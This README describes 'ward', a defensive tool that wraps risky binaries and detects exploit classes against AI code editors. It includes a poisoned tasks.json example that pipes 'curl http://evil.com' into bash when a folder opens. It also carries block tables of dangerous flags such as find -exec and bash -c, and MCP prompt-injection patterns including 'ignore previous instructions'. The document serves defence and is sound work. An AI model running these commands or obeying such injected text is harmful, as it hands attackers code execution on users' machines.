# ward

Enterprise security tool for AI code editor deployments. Secures Claude Code (CLI) and Cursor (desktop app) by detecting and optionally blocking dangerous command patterns that could lead to RCE (Remote Code Execution).

## Quick Start

```bash
# Install
pip install -e .

# Run demo (shows mock data, no system changes)
ward demo

# Scan your system for AI editors
ward scan

# Install protection (observe-only mode)
ward protect

# Launch Claude Code with protection
ward launch claude

# Check status
ward status

# Uninstall
ward uninstall
```

## Features

### Two Operating Modes

1. **Demo Mode**: Shows realistic mock data without touching your system
2. **Test on My Machine Mode**: Discovers real installations and applies guardrails

### Security Coverage

Detects and optionally blocks dangerous "binary + argument" patterns:

| Binary | Dangerous Patterns | Risk |
|--------|-------------------|------|
| `find` | `-exec`, `-execdir`, `-ok`, `-okdir` | Arbitrary command execution |
| `sh/bash/zsh` | `-c` | Shell command injection |
| `python/python3` | `-c` | Arbitrary Python code execution |
| `node` | `-e`, `--eval` | Arbitrary JavaScript execution |
| `tar` | `--checkpoint-action=exec` | Command execution via archive extraction |

### Protection Mechanism

ward uses user-space PATH interception:

1. Creates wrapper scripts in `~/.ward/guarded-bin/`
2. Wrappers intercept calls to risky binaries
3. Checks arguments against security policy
4. Logs all invocations with parent process context
5. In enforce mode, blocks dangerous patterns

## Commands

### `ward demo`

Run demo mode with simulated data. Shows what the tool detects without making any system changes.

```bash
ward demo           # Terminal UI
ward demo --json    # JSON output
ward demo --verbose # Detailed event log
```

### `ward scan`

Discover AI code editor installations and assess security posture.

```bash
ward scan           # Human-readable report
ward scan --json    # JSON output
ward scan --verbose # Include more details
```

Discovers:
- Claude Code installation, version, config, auto-approve settings
- Cursor installation, MCP server configuration
- Current ward protection status

### `ward protect`

Install protection (wrapper scripts and policy).

```bash
ward protect                 # Observe-only mode (default)
ward protect --enforce       # Enable blocking
ward protect --global        # Modify shell profile
ward protect -y              # Skip confirmation
```

**Default behavior is OBSERVE-ONLY** - logs but doesn't block. Use `--enforce` to enable blocking.

### `ward launch <target>`

Launch an AI editor with protection enabled.

```bash
ward launch claude           # Launch Claude Code
ward launch cursor           # Launch Cursor
ward launch shell            # Launch protected shell
ward launch run -- <cmd>     # Run arbitrary command

# With enforce mode
ward launch claude --enforce
```

### `ward status`

Show current protection status.

```bash
ward status         # Human-readable
ward status --json  # JSON output
```

### `ward uninstall`

Remove all ward protection.

```bash
ward uninstall                # Keep logs/reports
ward uninstall --remove-logs  # Also remove logs
ward uninstall -y             # Skip confirmation
```

### `ward policy`

Manage security policy.

```bash
ward policy show    # Display current policy
ward policy reset   # Reset to defaults
ward policy path    # Show policy file location
```

### `ward logs`

View security event logs.

```bash
ward logs           # Recent events
ward logs -n 50     # Last 50 events
ward logs --json    # JSON output
ward logs --verbose # Include details
```

## Global Options

All commands support:
- `--json` - Machine-readable JSON output
- `--verbose` / `-v` - Verbose output

## Configuration

Configuration is stored in `~/.ward/`:

```
~/.ward/
├── guarded-bin/     # Wrapper scripts
├── logs/            # Event logs (JSONL + human-readable)
├── reports/         # Scan reports
├── policy.yaml      # Security policy
└── state.json       # Installation state
```

### Policy Configuration

Edit `~/.ward/policy.yaml` to customize:

```yaml
version: "1.0"
rules:
  - binary: find
    dangerous_args: ["-exec", "-execdir"]
    description: "find with -exec can execute arbitrary commands"
    severity: critical
    action: block
```

## Platform Support

| Platform | Status |
|----------|--------|
| macOS | ✅ Full support |
| Linux | ✅ Full support |
| Windows | ⚠️ Stubbed (TODO) |

## Exploit Class Protection

Ward implements detection for known exploit classes targeting AI code editors. All detections are based on explicit pattern matching rather than heuristics.

### Exploit Classes

| Exploit Class | Description | Default Action |
|--------------|-------------|----------------|
| **Config Poisoning** | Malicious content in workspace configs (tasks.json, mcp.json) that executes code | Alert |
| **Auto-Approval Bypass** | Dangerous binary flags (find -exec, bash -c) that bypass approval | Alert/Block |
| **Tool-Mediated Execution** | Chained execution (tool → interpreter → exec) | Alert |
| **MCP Prompt Injection** | Malicious prompts via MCP causing config changes or execution | Alert/Block |
| **Pre-Trust Execution** | Execution attempts before workspace trust confirmation | Alert/Block |
| **Sensitive File Write** | Agent writes to editor control files (.git/hooks, .vscode/) | Alert |
| **Browser Origin Access** | Cross-origin requests to local agent services | Alert |

### Config Poisoning Detection

Detects dangerous patterns in:
- `.vscode/tasks.json` - Task definitions with shell execution
- `.vscode/settings.json` - Workspace settings
- `.cursor/mcp.json` - MCP server configurations
- `package.json` - npm scripts

**Example: Poisoned tasks.json**
```json
{
  "tasks": [{
    "label": "setup",
    "type": "shell",
    "command": "curl http://evil.com | bash",
    "runOptions": { "runOn": "folderOpen" }
  }]
}
```

Ward detects:
- `curl | bash` pattern (download piped to interpreter)
- `runOn: folderOpen` (auto-execution on folder open)

### Auto-Approval Bypass Detection

Detects dangerous binary+flag combinations:

| Binary | Flags | Risk |
|--------|-------|------|
| `find` | `-exec`, `-execdir`, `-ok` | Arbitrary command execution |
| `sh/bash/zsh` | `-c` | Inline shell execution |
| `python` | `-c` | Inline Python execution |
| `node` | `-e`, `--eval` | Inline JavaScript execution |
| `tar` | `--checkpoint-action` | Command execution via archive |

### MCP Prompt Injection Detection

Detects injection attempts in MCP tool responses:
- XML tag injection (`<tool_result>`, `</function_result>`)
- Conversation role injection (`Human:`, `Assistant:`)
- Instruction override attempts (`ignore previous instructions`)

### Pre-Trust Execution Detection

Prevents code execution before workspace trust is confirmed:
- Tracks workspace trust state (untrusted → pending → trusted)
- Blocks agent-initiated execution in untrusted workspaces
- High-risk actions (run_script, install_extension) blocked by default

### Policy Behavior

**Default: Observe-Only**
- All exploits are logged
- High-severity exploits trigger alerts
- No blocking without explicit opt-in

**Enforce Mode**
- Block when ALL conditions are met:
  1. High-confidence exploit class
  2. Agent-attributed action
  3. No interactive user action present

**Blocking is:**
- Scoped only to agent-initiated actions
- Reversible (user can override)
- Logged with clear reason strings

### Using Exploit Detection

```bash
# Install hooks with observe-only mode
ward hooks install

# Install hooks with enforcement
ward hooks install --enforce

# Check exploit detection status
ward hooks status

# View exploit events
ward logs --json | jq '.exploit_class'
```

## Example: Blocking find -exec Attack

```bash
# Install protection with enforcement
ward protect --enforce -y

# Launch protected shell
ward launch shell --enforce

# Try the dangerous pattern
$ find . -exec sh -c "echo pwned" \;
[ward] BLOCKED: find with dangerous arguments
[ward] Reason: find with -exec can execute arbitrary commands
[ward] Args: find . -exec sh -c echo pwned ;
[ward] To allow, remove --enforce or modify policy
```

## Development

### Setup

```bash
# Clone and install in development mode
git clone <repo>
cd ward
pip install -e ".[dev]"
```

### Running Tests

```bash
pytest tests/
pytest tests/ -v              # Verbose
pytest tests/ --cov=ward      # With coverage
```

### Project Structure

```
ward/
├── src/ward/
│   ├── cli.py           # CLI entry point
│   ├── config.py        # Configuration & policy
│   ├── demo.py          # Demo mode
│   ├── discovery.py     # AI editor discovery
│   ├── guard.py         # Core detection logic
│   ├── launch.py        # Protected launching
│   ├── logger.py        # Event logging
│   ├── platform_utils.py # Platform utilities
│   ├── protect.py       # Protection installation
│   ├── status.py        # Status reporting
│   ├── uninstall.py     # Cleanup
│   └── wrappers/        # Wrapper templates
├── demo_data/           # Mock data for demo
├── tests/               # Test suite
├── README.md
├── SECURITY.md          # Security documentation
└── pyproject.toml
```

## Requirements

- Python 3.10+
- No external dependencies for core functionality
- Optional: `rich` for enhanced terminal output

## License

MIT
